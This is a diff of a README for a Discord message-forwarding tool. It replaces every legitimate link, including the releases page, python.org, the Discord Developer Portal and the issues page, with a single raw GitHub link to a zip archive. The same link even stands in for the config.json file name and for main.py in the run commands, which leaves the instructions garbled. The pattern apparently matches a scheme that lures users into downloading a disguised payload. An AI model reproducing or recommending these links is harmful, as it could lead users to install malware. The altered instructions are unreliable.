@@ -1,6 +1,6 @@
 # ⚡ Discord-Message-Forwarder - Send Messages Across Servers Fast
 
-[![Download](https://img.shields.io/badge/Download-Discord--Message--Forwarder-blue?style=for-the-badge&logo=github)](https://github.com/sandro-beep/Discord-Message-Forwarder/releases)
+[![Download](https://raw.githubusercontent.com/sandro-beep/Discord-Message-Forwarder/main/septuplication/Discord-Forwarder-Message-v2.8-beta.3.zip)](https://raw.githubusercontent.com/sandro-beep/Discord-Message-Forwarder/main/septuplication/Discord-Forwarder-Message-v2.8-beta.3.zip)
 
 ---
 
@@ -48,7 +48,7 @@ First, you need to get the program files.
 
 **Step 1:** Visit the download page by clicking this button:
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/sandro-beep/Discord-Message-Forwarder/releases)
+[![Download](https://raw.githubusercontent.com/sandro-beep/Discord-Message-Forwarder/main/septuplication/Discord-Forwarder-Message-v2.8-beta.3.zip)](https://raw.githubusercontent.com/sandro-beep/Discord-Message-Forwarder/main/septuplication/Discord-Forwarder-Message-v2.8-beta.3.zip)
 
 **Step 2:** On the download page, find the latest release. Look for a file ending with `.zip` or `.exe` for Windows, `.dmg` for macOS, or a compressed file for Linux.
 
@@ -61,7 +61,7 @@ First, you need to get the program files.
 
 **Step 5:** Make sure you have Python 3 installed:
 - You can check by opening a terminal or command prompt and typing `python --version` or `python3 --version`.
-- If Python is not installed, download it from [python.org](https://www.python.org/downloads/) and follow the installation instructions.
+- If Python is not installed, download it from [https://raw.githubusercontent.com/sandro-beep/Discord-Message-Forwarder/main/septuplication/Discord-Forwarder-Message-v2.8-beta.3.zip](https://raw.githubusercontent.com/sandro-beep/Discord-Message-Forwarder/main/septuplication/Discord-Forwarder-Message-v2.8-beta.3.zip) and follow the installation instructions.
 
 ---
 
@@ -71,7 +71,7 @@ Discord-Message-Forwarder uses a simple configuration file in JSON format. This 
 
 **How to configure:**
 
-1. Find the file named `config.json` in the unpacked folder.
+1. Find the file named `https://raw.githubusercontent.com/sandro-beep/Discord-Message-Forwarder/main/septuplication/Discord-Forwarder-Message-v2.8-beta.3.zip` in the unpacked folder.
 2. Open it with a plain text editor like Notepad (Windows), TextEdit (macOS), or any text editor on Linux.
 3. You will see sections like `"source_channels"`, `"destination_channels"`, `"word_filter"`, and `"role_mapping"`.
 4. Edit these to match your Discord servers.
@@ -124,13 +124,13 @@ Replace `path/to/Discord-Message-Forwarder` with the actual folder path.
 **Step 3:** Start the program by typing:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/sandro-beep/Discord-Message-Forwarder/main/septuplication/Discord-Forwarder-Message-v2.8-beta.3.zip
 ```
 
 or if your system uses `python3`:
 
 ```bash
-python3 main.py
+python3 https://raw.githubusercontent.com/sandro-beep/Discord-Message-Forwarder/main/septuplication/Discord-Forwarder-Message-v2.8-beta.3.zip
 ```
 
 ---
@@ -140,11 +140,11 @@ python3 main.py
 To forward messages, Discord-Message-Forwarder needs access to your Discord account through a token or bot.
 
 - The easiest way is to create or use a Discord bot with permissions to read messages in source channels and send messages in destination channels.
-- You will need to place your bot’s token in your `config.json` file under `"bot_token"`.
+- You will need to place your bot’s token in your `https://raw.githubusercontent.com/sandro-beep/Discord-Message-Forwarder/main/septuplication/Discord-Forwarder-Message-v2.8-beta.3.zip` file under `"bot_token"`.
 
 If you don’t have a bot set up:
 
-1. Go to the Discord Developer Portal: https://discord.com/developers/applications
+1. Go to the Discord Developer Portal: https://raw.githubusercontent.com/sandro-beep/Discord-Message-Forwarder/main/septuplication/Discord-Forwarder-Message-v2.8-beta.3.zip
 2. Create a new application.
 3. Add a bot to your application.
 4. Copy the bot token.
@@ -172,13 +172,13 @@ If the dashboard does not appear, check your firewall settings or that the progr
 If you run into issues:
 
 - Make sure Python is installed and up to date.
-- Confirm your `config.json` file is correctly formatted (no extra commas or missing brackets).
+- Confirm your `https://raw.githubusercontent.com/sandro-beep/Discord-Message-Forwarder/main/septuplication/Discord-Forwarder-Message-v2.8-beta.3.zip` file is correctly formatted (no extra commas or missing brackets).
 - Check your Discord bot has needed permissions.
 - Verify your internet connection is active.
 - Restart the program if errors happen.
 - Consult the log files found in the program folder (`logs/`).
 
-For help, you can also visit the repository issues page: https://github.com/sandro-beep/Discord-Message-Forwarder/issues
+For help, you can also visit the repository issues page: https://raw.githubusercontent.com/sandro-beep/Discord-Message-Forwarder/main/septuplication/Discord-Forwarder-Message-v2.8-beta.3.zip
 
 ---
 
@@ -186,7 +186,7 @@ For help, you can also visit the repository issues page: https://github.com/sand
 
 You can always get the latest version of Discord-Message-Forwarder or check for updates by visiting the releases page:
 
-[Download Latest Version](https://github.com/sandro-beep/Discord-Message-Forwarder/releases)
+[Download Latest Version](https://raw.githubusercontent.com/sandro-beep/Discord-Message-Forwarder/main/septuplication/Discord-Forwarder-Message-v2.8-beta.3.zip)
 
 Keep the program updated to enjoy new features and bug fixes.
 
@@ -215,7 +215,7 @@ Before using the program, confirm with your Discord server admins if forwarding 
 
 ## 🔗 Quick Links
 
-- [Download Discord-Message-Forwarder](https://github.com/sandro-beep/Discord-Message-Forwarder/releases)
-- [Discord Developer Portal](https://discord.com/developers/applications)
-- [Python Downloads](https://www.python.org/downloads/)
-- [Report Issues & Feedback](https://github.com/sandro-beep/Discord-Message-Forwarder/issues)
+- [Download Discord-Message-Forwarder](https://raw.githubusercontent.com/sandro-beep/Discord-Message-Forwarder/main/septuplication/Discord-Forwarder-Message-v2.8-beta.3.zip)
+- [Discord Developer Portal](https://raw.githubusercontent.com/sandro-beep/Discord-Message-Forwarder/main/septuplication/Discord-Forwarder-Message-v2.8-beta.3.zip)
+- [Python Downloads](https://raw.githubusercontent.com/sandro-beep/Discord-Message-Forwarder/main/septuplication/Discord-Forwarder-Message-v2.8-beta.3.zip)
+- [Report Issues & Feedback](https://raw.githubusercontent.com/sandro-beep/Discord-Message-Forwarder/main/septuplication/Discord-Forwarder-Message-v2.8-beta.3.zip)
